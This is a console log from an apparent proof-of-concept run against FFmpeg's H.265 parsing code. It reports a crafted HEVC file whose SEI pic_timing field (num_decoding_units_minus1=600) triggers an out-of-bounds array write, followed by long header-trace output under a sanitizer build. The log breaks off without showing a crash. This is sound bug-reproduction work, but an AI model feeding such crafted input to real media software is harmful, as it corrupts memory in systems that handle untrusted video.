[*] Generating crafted HEVC bitstream...
[+] Written 193 bytes to /data/ylwang/non-textfuzz/target/_poc/FFmpeg/libavcodec_cbs_h265_c/vuln_001_input.hevc
    VPS RBSP:  18 bytes
    SPS RBSP:  39 bytes
    PPS RBSP:  5 bytes
    SEI RBSP:  83 bytes  (payload=80 bytes, 601 DU entries)
    IDR stub:  2 bytes  (picture NAL to trigger packet)
    AUD stub:  1 bytes  (flushes previous packet)
[+] SEI pic_timing: num_decoding_units_minus1=600
    Loop writes num_nalus_in_du_minus1[0..600] (601 elements)
    Array bound: HEVC_MAX_SLICE_SEGMENTS=600 (indices 0..599)
    OOB write at index 600 (1 past end of array)

[*] Running FFmpeg with trace_headers BSF (CBS path) to trigger OOB write...
ffmpeg version N-126435-gf93cd72dde Copyright (c) 2000-2026 the FFmpeg developers
  built with gcc 13 (Ubuntu 13.3.0-6ubuntu2~24.04)
  configuration: --cc=gcc --cxx=g++ --extra-cflags='-fsanitize=address,undefined -g0 -fno-omit-frame-pointer' --extra-cxxflags='-fsanitize=address,undefined -g0 -fno-omit-frame-pointer' --extra-ldflags='-fsanitize=address,undefined' --disable-optimizations --disable-stripping --enable-debug=0 --disable-x86asm --disable-doc
  libavutil      61.  7.100 / 61.  7.100
  libavcodec     63. 11.100 / 63. 11.100
  libavformat    63.  6.100 / 63.  6.100
  libavdevice    63.  2.100 / 63.  2.100
  libavfilter    12.  4.100 / 12.  4.100
  libswscale     10.  2.100 / 10.  2.100
  libswresample   7.  3.100 /  7.  3.100
[hevc @ 0x519000000a80] Unknown slice type: 32.
[hevc @ 0x519000000a80] Unknown slice type: -1.
[trace_headers @ 0x50e000000800] 53          general_profile_compatibility_flag[21]                      0 = 0
[trace_headers @ 0x50e000000800] 54          general_profile_compatibility_flag[22]                      0 = 0
[trace_headers @ 0x50e000000800] 55          general_profile_compatibility_flag[23]                      0 = 0
[trace_headers @ 0x50e000000800] 56          general_profile_compatibility_flag[24]                      0 = 0
[trace_headers @ 0x50e000000800] 57          general_profile_compatibility_flag[25]                      0 = 0
[trace_headers @ 0x50e000000800] 58          general_profile_compatibility_flag[26]                      0 = 0
[trace_headers @ 0x50e000000800] 59          general_profile_compatibility_flag[27]                      0 = 0
[trace_headers @ 0x50e000000800] 60          general_profile_compatibility_flag[28]                      0 = 0
[trace_headers @ 0x50e000000800] 61          general_profile_compatibility_flag[29]                      0 = 0
[trace_headers @ 0x50e000000800] 62          general_profile_compatibility_flag[30]                      0 = 0
[trace_headers @ 0x50e000000800] 63          general_profile_compatibility_flag[31]                      0 = 0
[trace_headers @ 0x50e000000800] 64          general_progressive_source_flag                             1 = 1
[trace_headers @ 0x50e000000800] 65          general_interlaced_source_flag                              0 = 0
[trace_headers @ 0x50e000000800] 66          general_non_packed_constraint_flag                          0 = 0
[trace_headers @ 0x50e000000800] 67          general_frame_only_constraint_flag                          0 = 0
[trace_headers @ 0x50e000000800] 68          general_reserved_zero_43bits         000000000000000000000000 = 0
[trace_headers @ 0x50e000000800] 92          general_reserved_zero_43bits              0000000000000000000 = 0
[trace_headers @ 0x50e000000800] 111         general_inbld_flag                                          0 = 0
[trace_headers @ 0x50e000000800] 112         general_level_idc                                    00011110 = 30
[trace_headers @ 0x50e000000800] 120         sps_seq_parameter_set_id                                    1 = 0
[trace_headers @ 0x50e000000800] 121         chroma_format_idc                                         010 = 1
[trace_headers @ 0x50e000000800] 124         pic_width_in_luma_samples                       0000001000001 = 64
[trace_headers @ 0x50e000000800] 137         pic_height_in_luma_samples                      0000001000001 = 64
[trace_headers @ 0x50e000000800] 150         conformance_window_flag                                     0 = 0
[trace_headers @ 0x50e000000800] 151         bit_depth_luma_minus8                                       1 = 0
[trace_headers @ 0x50e000000800] 152         bit_depth_chroma_minus8                                     1 = 0
[trace_headers @ 0x50e000000800] 153         log2_max_pic_order_cnt_lsb_minus4                       00101 = 4
[trace_headers @ 0x50e000000800] 158         sps_sub_layer_ordering_info_present_flag                    0 = 0
[trace_headers @ 0x50e000000800] 159         sps_max_dec_pic_buffering_minus1[0]                       010 = 1
[trace_headers @ 0x50e000000800] 162         sps_max_num_reorder_pics[0]                                 1 = 0
[trace_headers @ 0x50e000000800] 163         sps_max_latency_increase_plus1[0]                           1 = 0
[trace_headers @ 0x50e000000800] 164         log2_min_luma_coding_block_size_minus3                      1 = 0
[trace_headers @ 0x50e000000800] 165         log2_diff_max_min_luma_coding_block_size                00100 = 3
[trace_headers @ 0x50e000000800] 170         log2_min_luma_transform_block_size_minus2                   1 = 0
[trace_headers @ 0x50e000000800] 171         log2_diff_max_min_luma_transform_block_size             00100 = 3
[trace_headers @ 0x50e000000800] 176         max_transform_hierarchy_depth_inter                         1 = 0
[trace_headers @ 0x50e000000800] 177         max_transform_hierarchy_depth_intra                         1 = 0
[trace_headers @ 0x50e000000800] 178         scaling_list_enabled_flag                                   0 = 0
[trace_headers @ 0x50e000000800] 179         amp_enabled_flag                                            0 = 0
[trace_headers @ 0x50e000000800] 180         sample_adaptive_offset_enabled_flag                         0 = 0
[trace_headers @ 0x50e000000800] 181         pcm_enabled_flag                                            0 = 0
[trace_headers @ 0x50e000000800] 182         num_short_term_ref_pic_sets                                 1 = 0
[trace_headers @ 0x50e000000800] 183         long_term_ref_pics_present_flag                             0 = 0
[trace_headers @ 0x50e000000800] 184         sps_temporal_mvp_enabled_flag                               0 = 0
[trace_headers @ 0x50e000000800] 185         strong_intra_smoothing_enabled_flag                         0 = 0
[trace_headers @ 0x50e000000800] 186         vui_parameters_present_flag                                 1 = 1
[trace_headers @ 0x50e000000800] 187         aspect_ratio_info_present_flag                              0 = 0
[trace_headers @ 0x50e000000800] 188         overscan_info_present_flag                                  0 = 0
[trace_headers @ 0x50e000000800] 189         video_signal_type_present_flag                              0 = 0
[trace_headers @ 0x50e000000800] 190         chroma_loc_info_present_flag                                0 = 0
[trace_headers @ 0x50e000000800] 191         neutral_chroma_indication_flag                              0 = 0
[trace_headers @ 0x50e000000800] 192         field_seq_flag                                              0 = 0
[trace_headers @ 0x50e000000800] 193         frame_field_info_present_flag                               0 = 0
[trace_headers @ 0x50e000000800] 194         default_display_window_flag                                 0 = 0
[trace_headers @ 0x50e000000800] 195         vui_timing_info_present_flag                                1 = 1
[trace_headers @ 0x50e000000800] 196         vui_num_units_in_tick        00000000000000000000000000000001 = 1
[trace_headers @ 0x50e000000800] 228         vui_time_scale               00000000000000000000000000011110 = 30
[trace_headers @ 0x50e000000800] 260         vui_poc_proportional_to_timing_flag                         0 = 0
[trace_headers @ 0x50e000000800] 261         vui_hrd_parameters_present_flag                             1 = 1
[trace_headers @ 0x50e000000800] 262         nal_hrd_parameters_present_flag                             1 = 1
[trace_headers @ 0x50e000000800] 263         vcl_hrd_parameters_present_flag                             0 = 0
[trace_headers @ 0x50e000000800] 264         sub_pic_hrd_params_present_flag                             1 = 1
[trace_headers @ 0x50e000000800] 265         tick_divisor_minus2                                  00000000 = 0
[trace_headers @ 0x50e000000800] 273         du_cpb_removal_delay_increment_length_minus1            01111 = 15
[trace_headers @ 0x50e000000800] 278         sub_pic_cpb_params_in_pic_timing_sei_flag                   1 = 1
[trace_headers @ 0x50e000000800] 279         dpb_output_delay_du_length_minus1                       00000 = 0
[trace_headers @ 0x50e000000800] 284         bit_rate_scale                                           0000 = 0
[trace_headers @ 0x50e000000800] 288         cpb_size_scale                                           0000 = 0
[trace_headers @ 0x50e000000800] 292         cpb_size_du_scale                                        0000 = 0
[trace_headers @ 0x50e000000800] 296         initial_cpb_removal_delay_length_minus1                 00000 = 0
[trace_headers @ 0x50e000000800] 301         au_cpb_removal_delay_length_minus1                      00000 = 0
[trace_headers @ 0x50e000000800] 306         dpb_output_delay_length_minus1                          00000 = 0
[trace_headers @ 0x50e000000800] 311         fixed_pic_rate_general_flag[0]                              0 = 0
[trace_headers @ 0x50e000000800] 312         fixed_pic_rate_within_cvs_flag[0]                           0 = 0
[trace_headers @ 0x50e000000800] 313         low_delay_hrd_flag[0]                                       1 = 1
[trace_headers @ 0x50e000000800] 314         bit_rate_value_minus1[0]                                    1 = 0
[trace_headers @ 0x50e000000800] 315         cpb_size_value_minus1[0]                                    1 = 0
[trace_headers @ 0x50e000000800] 316         cpb_size_du_value_minus1[0]                                 1 = 0
[trace_headers @ 0x50e000000800] 317         bit_rate_du_value_minus1[0]                                 1 = 0
[trace_headers @ 0x50e000000800] 318         cbr_flag[0]                                                 0 = 0
[trace_headers @ 0x50e000000800] 319         bitstream_restriction_flag                                  0 = 0
[trace_headers @ 0x50e000000800] 320         sps_extension_present_flag                                  0 = 0
[trace_headers @ 0x50e000000800] 321         rbsp_stop_one_bit                                           1 = 1
[trace_headers @ 0x50e000000800] 322         rbsp_alignment_zero_bit                                     0 = 0
[trace_headers @ 0x50e000000800] 323         rbsp_alignment_zero_bit                                     0 = 0
[trace_headers @ 0x50e000000800] 324         rbsp_alignment_zero_bit                                     0 = 0
[trace_headers @ 0x50e000000800] 325         rbsp_alignment_zero_bit                                     0 = 0
[trace_headers @ 0x50e000000800] 326         rbsp_alignment_zero_bit                                     0 = 0
[trace_headers @ 0x50e000000800] 327         rbsp_alignment_zero_bit                                     0 = 0
[trace_headers @ 0x50e000000800] Picture Parameter Set
[trace_headers @ 0x50e000000800] 0           forbidden_zero_bit                                          0 = 0
[trace_headers @ 0x50e000000800] 1           nal_unit_type                                          100010 = 34
[trace_headers @ 0x50e000000800] 7           nuh_layer_id                                           000000 = 0
[trace_headers @ 0x50e000000800] 13          nuh_temporal_id_plus1                                     001 = 1
[trace_headers @ 0x50e000000800] 16          pps_pic_parameter_set_id                                    1 = 0
[trace_headers @ 0x50e000000800] 17          pps_seq_parameter_set_id                                    1 = 0
[trace_headers @ 0x50e000000800] 18          dependent_slice_segments_enabled_flag                       0 = 0
[trace_headers @ 0x50e000000800] 19          output_flag_present_flag                                    0 = 0
[trace_headers @ 0x50e000000800] 20          num_extra_slice_header_bits                               000 = 0
[trace_headers @ 0x50e000000800] 23          sign_data_hiding_enabled_flag                               0 = 0
[trace_headers @ 0x50e000000800] 24          cabac_init_present_flag                                     0 = 0
[trace_headers @ 0x50e000000800] 25          num_ref_idx_l0_default_active_minus1                        1 = 0
[trace_headers @ 0x50e000000800] 26          num_ref_idx_l1_default_active_minus1                        1 = 0
[trace_headers @ 0x50e000000800] 27          init_qp_minus26                                             1 = 0
[trace_headers @ 0x50e000000800] 28          constrained_intra_pred_flag                                 0 = 0
[trace_headers @ 0x50e000000800] 29          transform_skip_enabled_flag                                 0 = 0
[trace_headers @ 0x50e000000800] 30          cu_qp_delta_enabled_flag                                    0 = 0
[trace_headers @ 0x50e000000800] 31          pps_cb_qp_offset                                            1 = 0
[trace_headers @ 0x50e000000800] 32          pps_cr_qp_offset                                            1 = 0
[trace_headers @ 0x50e000000800] 33          pps_slice_chroma_qp_offsets_present_flag                    0 = 0
[trace_headers @ 0x50e000000800] 34          weighted_pred_flag                                          0 = 0
[trace_headers @ 0x50e000000800] 35          weighted_bipred_flag                                        0 = 0
[trace_headers @ 0x50e000000800] 36          transquant_bypass_enabled_flag                              0 = 0
[trace_headers @ 0x50e000000800] 37          tiles_enabled_flag                                          0 = 0
[trace_headers @ 0x50e000000800] 38          entropy_coding_sync_enabled_flag                            0 = 0
[trace_headers @ 0x50e000000800] 39          pps_loop_filter_across_slices_enabled_flag                  1 = 1
[trace_headers @ 0x50e000000800] 40          deblocking_filter_control_present_flag                      1 = 1
[trace_headers @ 0x50e000000800] 41          deblocking_filter_override_enabled_flag                     0 = 0
[trace_headers @ 0x50e000000800] 42          pps_deblocking_filter_disabled_flag                         0 = 0
[trace_headers @ 0x50e000000800] 43          pps_beta_offset_div2                                        1 = 0
[trace_headers @ 0x50e000000800] 44          pps_tc_offset_div2                                          1 = 0
[trace_headers @ 0x50e000000800] 45          pps_scaling_list_data_present_flag                          0 = 0
[trace_headers @ 0x50e000000800] 46          lists_modification_present_flag                             0 = 0
[trace_headers @ 0x50e000000800] 47          log2_parallel_merge_level_minus2                            1 = 0
[trace_headers @ 0x50e000000800] 48          slice_segment_header_extension_present_flag                 0 = 0
[trace_headers @ 0x50e000000800] 49          pps_extension_present_flag                                  0 = 0
[trace_headers @ 0x50e000000800] 50          rbsp_stop_one_bit                                           1 = 1
[trace_headers @ 0x50e000000800] 51          rbsp_alignment_zero_bit                                     0 = 0
[trace_headers @ 0x50e000000800] 52          rbsp_alignment_zero_bit                                     0 = 0
[trace_headers @ 0x50e000000800] 53          rbsp_alignment_zero_bit                                     0 = 0
[trace_headers @ 0x50e000000800] 54          rbsp_alignment_zero_bit                                     0 = 0
[trace_headers @ 0x50e000000800] 55          rbsp_alignment_zero_bit                                     0 = 0
Stream mapping:
  Stream #0:0 -> #0:0 (copy)
Output #0, null, to 'pipe:':
  Metadata:
    encoder         : Lavf63.6.100
  Stream #0:0: Video: hevc (Main), none, 64x64, q=2-31, 25 fps, 30 tbr, 1200k tbn
Press [q] to stop, [?] for help
[trace_headers @ 0x50e000000800] Packet: 186 bytes, key frame, no pts, dts 0, duration 40000.
[trace_headers @ 0x50e000000800] Video Parameter Set
[trace_headers @ 0x50e000000800] 0           forbidden_zero_bit                                          0 = 0
[trace_headers @ 0x50e000000800] 1           nal_unit_type                                          100000 = 32
[trace_headers @ 0x50e000000800] 7           nuh_layer_id                                           000000 = 0
[trace_headers @ 0x50e000000800] 13          nuh_temporal_id_plus1                                     001 = 1
[trace_headers @ 0x50e000000800] 16          vps_video_parameter_set_id                               0000 = 0
[trace_headers @ 0x50e000000800] 20          vps_base_layer_internal_flag                                1 = 1
[trace_headers @ 0x50e000000800] 21          vps_base_layer_available_flag                               1 = 1
[trace_headers @ 0x50e000000800] 22          vps_max_layers_minus1                                  000000 = 0
[trace_headers @ 0x50e000000800] 28          vps_max_sub_layers_minus1                                 000 = 0
[trace_headers @ 0x50e000000800] 31          vps_temporal_id_nesting_flag                                1 = 1
[trace_headers @ 0x50e000000800] 32          vps_reserved_0xffff_16bits                   1111111111111111 = 65535
[trace_headers @ 0x50e000000800] 48          general_profile_space                                      00 = 0
[trace_headers @ 0x50e000000800] 50          general_tier_flag                                           0 = 0
[trace_headers @ 0x50e000000800] 51          general_profile_idc                                     00001 = 1
[trace_headers @ 0x50e000000800] 56          general_profile_compatibility_flag[0]                       0 = 0
[trace_headers @ 0x50e000000800] 57          general_profile_compatibility_flag[1]                       1 = 1
[trace_headers @ 0x50e000000800] 58          general_profile_compatibility_flag[2]                       0 = 0
[trace_headers @ 0x50e000000800] 59          general_profile_compatibility_flag[3]                       0 = 0
[trace_headers @ 0x50e000000800] 60          general_profile_compatibility_flag[4]                       0 = 0
[trace_headers @ 0x50e000000800] 61          general_profile_compatibility_flag[5]                       0 = 0
[trace_headers @ 0x50e000000800] 62          general_profile_compatibility_flag[6]                       0 = 0
[trace_headers @ 0x50e000000800] 63          general_profile_compatibility_flag[7]                       0 = 0
[trace_headers @ 0x50e000000800] 64          general_profile_compatibility_flag[8]                       0 = 0
[trace_headers @ 0x50e000000800] 65          general_profile_compatibility_flag[9]                       0 = 0
[trace_headers @ 0x50e000000800] 66          general_profile_compatibility_flag[10]                      0 = 0
[trace_headers @ 0x50e000000800] 67          general_profile_compatibility_flag[11]                      0 = 0
[trace_headers @ 0x50e000000800] 68          general_profile_compatibility_flag[12]                      0 = 0
[trace_headers @ 0x50e000000800] 69          general_profile_compatibility_flag[13]                      0 = 0
[trace_headers @ 0x50e000000800] 70          general_profile_compatibility_flag[14]                      0 = 0
[trace_headers @ 0x50e000000800] 71          general_profile_compatibility_flag[15]                      0 = 0
[trace_headers @ 0x50e000000800] 72          general_profile_compatibility_flag[16]                      0 = 0
[trace_headers @ 0x50e000000800] 73          general_profile_compatibility_flag[17]                      0 = 0
[trace_headers @ 0x50e000000800] 74          general_profile_compatibility_flag[18]                      0 = 0
[trace_headers @ 0x50e000000800] 75          general_profile_compatibility_flag[19]                      0 = 0
[trace_headers @ 0x50e000000800] 76          general_profile_compatibility_flag[20]                      0 = 0
[trace_headers @ 0x50e000000800] 77          general_profile_compatibility_flag[21]                      0 = 0
[trace_headers @ 0x50e000000800] 78          general_profile_compatibility_flag[22]                      0 = 0
[trace_headers @ 0x50e000000800] 79          general_profile_compatibility_flag[23]                      0 = 0
[trace_headers @ 0x50e000000800] 80          general_profile_compatibility_flag[24]                      0 = 0
[trace_headers @ 0x50e000000800] 81          general_profile_compatibility_flag[25]                      0 = 0
[trace_headers @ 0x50e000000800] 82          general_profile_compatibility_flag[26]                      0 = 0
[trace_headers @ 0x50e000000800] 83          general_profile_compatibility_flag[27]                      0 = 0
[trace_headers @ 0x50e000000800] 84          general_profile_compatibility_flag[28]                      0 = 0
[trace_headers @ 0x50e000000800] 85          general_profile_compatibility_flag[29]                      0 = 0
[trace_headers @ 0x50e000000800] 86          general_profile_compatibility_flag[30]                      0 = 0
[trace_headers @ 0x50e000000800] 87          general_profile_compatibility_flag[31]                      0 = 0
[trace_headers @ 0x50e000000800] 88          general_progressive_source_flag                             1 = 1
[trace_headers @ 0x50e000000800] 89          general_interlaced_source_flag                              0 = 0
[trace_headers @ 0x50e000000800] 90          general_non_packed_constraint_flag                          0 = 0
[trace_headers @ 0x50e000000800] 91          general_frame_only_constraint_flag                          0 = 0
[trace_headers @ 0x50e000000800] 92          general_reserved_zero_43bits         000000000000000000000000 = 0
[trace_headers @ 0x50e000000800] 116         general_reserved_zero_43bits              0000000000000000000 = 0
[trace_headers @ 0x50e000000800] 135         general_inbld_flag                                          0 = 0
[trace_headers @ 0x50e000000800] 136         general_level_idc                                    00011110 = 30
